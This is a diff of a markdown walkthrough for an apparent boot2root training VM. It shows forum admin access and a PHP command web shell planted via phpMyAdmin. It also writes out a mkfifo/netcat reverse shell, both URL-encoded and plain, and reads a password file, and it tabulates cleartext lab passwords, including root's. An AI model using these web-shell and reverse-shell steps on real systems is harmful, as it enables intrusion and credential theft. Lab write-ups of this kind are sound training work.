@@ -172,6 +172,16 @@ So we know the clear pwd of laurie so we can copy from the DB and paste in the p
 
 Now we can connect in the forum with **admin** and the same password than **lmezzard** 
 
+Now we can access at the __Admin page__
+
+![alt](/img/Admin_forum.png)
+
+![alt](/img/update_forum.png)
+
+![alt](/img/template_c.png)
+
+in this page there is some php files. We will note this **url**
+
 ----
 
 On phpmyadmin we can load file 
@@ -209,17 +219,34 @@ SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text
 https://192.168.1.146/forum/templates_c/cmd.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.146%2012345%20%3E%2Ftmp%2Ff
 
 Now, we can connect at https://192.168.1.146/forum/templates_c/cmd.php?cmd=id :
+![alt](/img/etc_passwd.png)
 
+-----------
 
-ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
+on our terminal 
+```sh
+nc -lnvp 1234
+```
+
+on the internet https://192.168.1.146/forum/templates_c/cmd.php :
+```sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+
+on our terminal 
+![alt](/img/nc_reverseshell.png)
+```sh
+cat /home/LOOKATME/password
+>> lmezard:G!@M6f4Eatau{sF"
+```
 
 ## Users informations
 
 |   Username |	Type | UID |	Homepage	| E-mail | pwd |
 |----| ---- | --- | --- |----- | ---- | 
 |   root |	root |	 0  | |	root@mail.borntosec.net|`Fg-'kKXBj87E:aJ$`|
-|   admin |	Admin |	 1000  | |	admin@borntosec.net | |
-|   lmezard |	User | 1040| 	 |		laurie@borntosec.net  | `!q\]Ej?*5K5cy*AJ` |
+|   admin |	Admin |	 1000  | |	admin@borntosec.net | | |
+|   lmezard |	User | 1040| 	 |		laurie@borntosec.net  | `!q\]Ej?*5K5cy*AJ` </br> `G!@M6f4Eatau{sF"`|
 |   qudevide |	User | | 	 |	qudevide@borntosec.net  | |
 |   thor |	User |	 | | 	thor@borntosec.net  | |
 |   wandre |	User | | 	 | wandre@borntosec.net | |
@@ -250,3 +277,11 @@ https://192.168.1.146/forum/index.php
 - GOBUSTER:
 	- https://hackviser.com/tactics/tools/gobuster
 	- https://github.com/drtychai/wordlists/blob/master/dirb/common.txt
+
+- tuto reverse shell :
+	- https://medium.com/@toon.commander/uploading-a-shell-in-phpmyadmin-61b066b481a7
+	- https://www.netspi.com/blog/technical-blog/network-pentesting/linux-hacking-case-studies-part-3-phpmyadmin/
+	- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+- mkfifo:
+	- http://manpagesfr.free.fr/man/man3/mkfifo.3.html
